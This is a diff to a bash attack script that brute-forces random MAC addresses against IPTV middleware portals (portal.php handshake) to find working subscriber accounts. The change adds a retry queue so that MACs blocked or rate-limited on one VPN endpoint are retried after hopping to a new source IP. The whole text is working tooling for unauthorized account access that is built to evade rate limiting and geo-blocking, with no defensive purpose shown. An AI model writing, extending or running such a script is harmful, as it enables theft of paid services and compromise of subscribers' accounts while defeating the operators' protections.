@@ -80,6 +80,8 @@ num_workers=${num_workers:-10}
 success_file=$(mktemp)
 echo "0" > "$success_file"
 hit_file=$(mktemp)
+retry_file=$(mktemp)   # MACs blocked on the previous VPN endpoint, retried
+                        # as soon as a fresh one is up
 
 
 hex=(0 1 2 3 4 5 6 7 8 9 A B C D E F)
@@ -93,23 +95,59 @@ progress() {
   } 200>"$success_file.lock"
 }
 
+# Retry queue: a MAC whose handshake failed on the current VPN endpoint is
+# parked here and retried once a fresh endpoint is up (so a geo-blocked MAC
+# gets a fair second chance on a new source IP). Serialized via flock.
+retry_take() {
+  local mac
+  mac=$(
+    exec 201>"$retry_file.lock"
+    flock -x 201
+    head -n1 "$retry_file" 2>/dev/null
+  )
+  if [[ -n $mac ]]; then
+    (
+      exec 201>"$retry_file.lock"
+      flock -x 201
+      sed -i "0,/^${mac}\$/d" "$retry_file"
+    )
+  fi
+  printf '%s' "$mac"
+}
+
+retry_store() {
+  (
+    exec 201>"$retry_file.lock"
+    flock -x 201
+    printf '%s\n' "$1" >> "$retry_file"
+    # cap the queue so a persistently-blocked portal can't grow it unbounded
+    if (( $(wc -l < "$retry_file") > 200 )); then
+      sed -i '1d' "$retry_file"
+    fi
+  )
+}
+
 scan_mac() {
   token_pat='"token":"'
   while true; do
     read -r current_count < "$success_file"
     ((current_count >= max_success_count)) && break
 
-    MAC="00:1A:79:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}"
+    # Prefer a MAC parked from a previous (blocked) endpoint before generating
+    # a fresh random one, so a geo-blocked MAC gets retried on the new IP.
+    MAC=$(retry_take)
+    [[ -z $MAC ]] && MAC="00:1A:79:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}"
     cookie="mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;"
 
     response=$(curl -s -i --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
       -H "Cookie: $cookie" \
       "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
-    # 000 / non-200 handshake (blocked, ratelimited, ...): hop to a fresh
-    # VPN server for a new source IP, then try the next MAC.
+    # 000 / non-200 handshake (blocked, ratelimited, ...): park this MAC for
+    # retry, hop to a fresh VPN server for a new source IP, then move on.
     if [[ $response != *"200"* ]]; then
       progress "scanning: $MAC [${RED}connection failed, ratelimited?${RESET}]"
+      retry_store "$MAC"
       vpn_switch
       continue
     fi
@@ -215,7 +253,7 @@ show_summary() {
       printf '%s  %s%s%s  Live TV: %s  VOD: %s  Series: %s%s\n' "$LIGHT_BLUE" "$GREEN" "$mac" "$LIGHT_BLUE" "$live" "$vod" "$series" "$RESET"
     done
   fi
-  rm -f "$success_file" "$success_file.lock" "$hit_file" "$VPN_LOCK" "$VPN_GEN"
+  rm -f "$success_file" "$success_file.lock" "$hit_file" "$VPN_LOCK" "$VPN_GEN" "$retry_file" "$retry_file.lock"
 }
 
 wait
